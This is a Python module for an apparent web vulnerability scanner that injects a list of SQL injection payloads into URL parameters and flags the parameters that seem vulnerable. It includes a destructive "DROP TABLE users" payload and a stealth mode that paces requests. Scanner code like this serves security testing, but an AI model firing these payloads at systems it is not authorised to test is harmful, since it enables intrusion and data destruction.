from core.scanner import BaseScanner
from typing import Dict, List, Optional
import asyncio

class SQLiScanner(BaseScanner):
    """SQL Injection vulnerability scanner"""
    
    def __init__(self, session, target: str, stealth: bool = False):
        super().__init__(session, target, stealth)
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> List[str]:
        """Load SQL injection payloads"""
        return [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "\" OR \"1\"=\"1",
            "' OR 1=1 --",
            "'; DROP TABLE users; --",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' WAITFOR DELAY '0:0:5'--",
            "admin' --",
            "' OR 1=1#",
            "1' ORDER BY 1--",
            "1' ORDER BY 100--",
            "' UNION ALL SELECT 1,2,3--",
            "1' AND SLEEP(5)--",
            "' AND SLEEP(5) AND '1'='1",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ]
        
    async def scan(self) -> List[Dict]:
        """Execute SQL injection scan"""
        # Test URL parameters
        if '?' in self.target:
            await self._test_url_parameters()
            
        # Test forms if deep scan
        if hasattr(self, 'forms'):
            await self._test_forms()
            
        return self.results
        
    async def _test_url_parameters(self):
        """Test URL parameters for SQL injection"""
        base_url, params = self.target.split('?', 1)
        param_pairs = [p.split('=', 1) for p in params.split('&')]
        
        for param_name, param_value in param_pairs:
            for payload in self.payloads[:10 if self.stealth else len(self.payloads)]:
                # Test payload
                test_params = {param_name: payload}
                test_url = self._build_url(base_url, test_params)
                
                result = await self.test_payload(payload, test_url)
                if result:
                    self.add_result(
                        'SQL Injection',
                        'HIGH',
                        test_url,
                        f"Parameter '{param_name}' vulnerable with payload: {payload}"
                    )
                    break  # Stop testing this parameter if found vulnerable
                    
                await asyncio.sleep(0.1 if self.stealth else 0)
                
    async def _test_forms(self):
        """Test forms for SQL injection"""
        # Implementation for form testing
        pass
        
    async def test_payload(self, payload: str, url: str) -> Optional[Dict]:
        """Test SQL injection payload"""
        # Get original response
        original_response = await self.http_client.get(self.target)
        
        # Test with payload
        test_response = await self.http_client.get(url)
        
        if original_response and test_response:
            is_vulnerable = self.validator.validate_sqli(
                original_response.text,
                test_response.text
            )
            
            if is_vulnerable:
                return {'vulnerable': True, 'payload': payload}
                
        return None
        
    def _build_url(self, base_url: str, params: Dict) -> str:
        """Build URL with parameters"""
        param_string = '&'.join([f"{k}={v}" for k, v in params.items()])
        return f"{base_url}?{param_string}"
